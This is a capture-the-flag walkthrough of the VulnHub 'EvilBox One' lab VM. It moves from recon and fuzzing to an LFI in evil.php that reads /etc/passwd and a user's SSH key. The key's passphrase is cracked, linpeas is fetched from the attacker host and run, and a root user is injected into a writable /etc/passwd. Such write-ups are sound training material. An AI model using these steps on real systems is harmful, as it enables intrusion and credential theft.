****
```http
https://www.vulnhub.com/entry/evilbox-one,736/
```
> [!NOTE]
> IP:192.168.3.181
___
# Recon
## Nmap
```bash
sudo nmap -p- -sC -sV -Pn -T5 192.168.3.181 -vv
```

```bash resoult  
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsg5B3Ae75r4szTNFqG247Ea8vKjxulITlFGE9YEK4KLJA86TskXQn9E24yX4cYMoF0WDn7JD782HfHCrV74r8nU2kVTw5Y8ZRyBEqDwk6vmOzMvq1Kzrcj+i4f17saErC9YVgx5/33e7UkLXt3MYVjVPIekf/sxWxS4b6N0+J1xiISNcoL/kmG3L7McJzX6Qx6cWtauJf3HOxNtZJ94WetHArSpUyIsn83P+Quxa/uaUgGPx4EkHL7Qx3AVIBbKA7uDet/pZUchcPq/4gv25DKJH4XIty+5/yNQo1EMd6Ra5A9SmnhWjSxdFqTGHpdKnyYHr4VeZ7cpvpQnoiV4y9
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJdleEd7RFnYXv0fbc4pC3l/OWWVAe8GNgoY3hK3C5tlUCvQF+LUFKqe5esCmzIkA8pvpNwEqxC8I2E5XjUtIBo=
|   256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqX8NlpHPg67roxI6Xi8VzNZqC5Uj9KHdAnOcD6/q5/
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:61:81:92 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!info]
> Open ports 22-SSH  OpenSSH 7.9p1 Debian 10+deb10u2 and 80 http Apache httpd 2.4.38
___

# WEB

> [!important]
> 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)

### Scan nikto
```bash
nikto -h 192.168.3.181:80
```

```bash resoults
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /secret/: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
```

```http
http://192.168.3.181/secret/
___
n/a
```

```http
http://192.168.3.181/icons/README
```

### Dirsearch
![EvilBox One](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/EvilBox/screenshots/20250514065937.png)

### FFUF
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FFUZ -u http://192.168.3.181/secret/FFUZ.php -ic -c    
```

```http 
http://192.168.3.181/secret/evil.php
```

## FUZZING TO LFI
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FFUZ -u http://192.168.3.181/secret/evil.php?FFUZ=..//..//..//..//..//..//etc/passwd -ic -c  -fs 0
```

```resoults
http://192.168.3.181/secret/evil.php?command=/../../../../etc/passwd
```

> [!Users]
> root:x:0:0:root:/root:/bin/bash
> mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash

# SSH

> [!success]
> 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

```http
http://192.168.3.181/secret/evil.php?command=/../../../../home/mowree/.ssh/id_rsa
```

![EvilBox One](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/EvilBox/screenshots/20250514174544.png)

## John crack 
```bash
ssh2john key > hash.txt
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![EvilBox One](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/EvilBox/screenshots/20250514175830.png)
___
```CREDS
mowree:unicorn
```
___
```bash
chmod 600 key
```

```bash
ssh -i key mowree@192.168.3.181
```

![EvilBox One](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/EvilBox/screenshots/20250514180433.png)
# Flag 1
![EvilBox One](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/EvilBox/screenshots/20250514180558.png)
___
# LPE
```bash
uname -a
```

```bash resoult
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
```
___
## Linpeas
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

```bash
python3 -m http.server 80
```

```bash
wget http://192.168.3.182/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```

![EvilBox One](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/EvilBox/screenshots/20250514181651.png)

```ls -la
-rw-rw-rw- 1 root root 1398 ago 16  2021 /etc/passwd
```

```bash
openssl passwd -1 goose1337
$1$UhTL/xF/$Ml8EXW6BnAteNXdnmfBFD.
```

```nano
GooseGusevich:$1$UhTL/xF/$Ml8EXW6BnAteNXdnmfBFD.:0:0:Goose:/home/GooseGusevich:/bin/bash
```

# Flag2
![EvilBox One](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/EvilBox/screenshots/20250514183953.png)
